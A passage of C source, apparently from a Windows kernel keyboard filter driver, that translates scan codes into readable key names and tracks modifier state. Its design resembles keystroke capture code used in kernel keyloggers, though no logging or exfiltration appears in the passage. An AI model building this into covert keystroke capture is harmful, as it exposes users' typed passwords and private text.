		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"H",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"h",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x24:
		ulLength = strlen("j");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"J",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"j",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x25:
		ulLength = strlen("k");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"K",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"k",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x26:
		ulLength = strlen("l");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"L",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"l",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x27:
		ulLength = strlen(";");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,":",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,";",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x28:
		ulLength = strlen("\'");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\"",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\'",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x29:
		ulLength = strlen("`");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"~",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"`",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x2A:
		ulLength = strlen("[Left-Shift]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Left-Shift]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x2B:
		ulLength = strlen("\\");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"|",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"\\",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x2C:
		ulLength = strlen("z");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"Z",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"z",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x2D:
		ulLength = strlen("x");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"X",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"x",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x2E:
		ulLength = strlen("c");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"C",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"c",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x2F:
		ulLength = strlen("v");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"V",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"v",ulLength);
			}
		}
		break;
	case 0x30:
		ulLength = strlen("b");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"B",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"b",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x31:
		ulLength = strlen("n");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"N",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"n",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x32:
		ulLength = strlen("m");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (GetKeyCase(pKeyState))
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"M",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"m",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x33:
		ulLength = strlen(",");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"<",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,",",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x34:
		ulLength = strlen(".");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,">",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,".",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x35:
		ulLength = strlen("/");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			if (pKeyState->bIsShift)
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"?",ulLength);
			}
			else
			{
				RtlCopyMemory(pKeyInfo->pShowKeyDat,"/",ulLength);
			}
			bRet = TRUE;
		}
		break;
	case 0x36:
		ulLength = strlen("[Right-Shift]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Right-Shift]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x38:
		ulLength = strlen("[Alt]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Alt]",ulLength);
			if (g_KeyState.bIsAlt)
			{
				g_KeyState.bIsAlt = FALSE;
			}
			else
			{
				g_KeyState.bIsAlt = TRUE;
			}
			bRet = TRUE;
		}
		break;
	case 0x39:
		ulLength = strlen("[Space]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Space]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x3A:
		ulLength = strlen("[Caps Lock]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Caps Lock]",ulLength);
			if (g_KeyState.bIsCapsLock)
			{
				g_KeyState.bIsCapsLock = FALSE;
			}
			else
			{
				g_KeyState.bIsCapsLock = TRUE;
			}
			bRet = TRUE;
		}
		break;
	case 0x48:
		ulLength = strlen("[Up]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Up]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x50:
		ulLength = strlen("[Down]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Down]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x4B:
		ulLength = strlen("[Left]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Left]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x4D:
		ulLength = strlen("[Right]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Right]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x5B:
		ulLength = strlen("[Left Windows]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Left Windows]",ulLength);
			if (g_KeyState.bIsWindows)
			{
				g_KeyState.bIsWindows = FALSE;
			}
			else
			{
				g_KeyState.bIsWindows = TRUE;
			}
			bRet = TRUE;
		}
		break;
	case 0x5C:
		ulLength = strlen("[Right Windows]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[Right Windows]",ulLength);
			if (g_KeyState.bIsWindows)
			{
				g_KeyState.bIsWindows = FALSE;
			}
			else
			{
				g_KeyState.bIsWindows = TRUE;
			}
			bRet = TRUE;
		}
		break;
	case 0x3B:
		ulLength = strlen("[F1]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F1]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x3C:
		ulLength = strlen("[F2]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F2]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x3D:
		ulLength = strlen("[F3]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F3]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x3E:
		ulLength = strlen("[F4]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F4]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x3F:
		ulLength = strlen("[F5]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F5]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x40:
		ulLength = strlen("[F6]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F6]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x41:
		ulLength = strlen("[F7]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F7]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x42:
		ulLength = strlen("[F8]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F8]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x43:
		ulLength = strlen("[F9]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F9]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x44:
		ulLength = strlen("[F10]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F10]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x57:
		ulLength = strlen("[F11]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F11]",ulLength);
			bRet = TRUE;
		}
		break;
	case 0x58:
		ulLength = strlen("[F12]");
		if (NULL == pKeyInfo->pShowKeyDat)
		{
			do 
			{
				pKeyInfo->pShowKeyDat = ExAllocatePool(NonPagedPool,ulLength + 1);
			} while (NULL == pKeyInfo->pShowKeyDat);
			RtlZeroMemory(pKeyInfo->pShowKeyDat,ulLength + 1);
			RtlCopyMemory(pKeyInfo->pShowKeyDat,"[F12]",ulLength);
			bRet = TRUE;
		}
		break;
	}
	return bRet;
}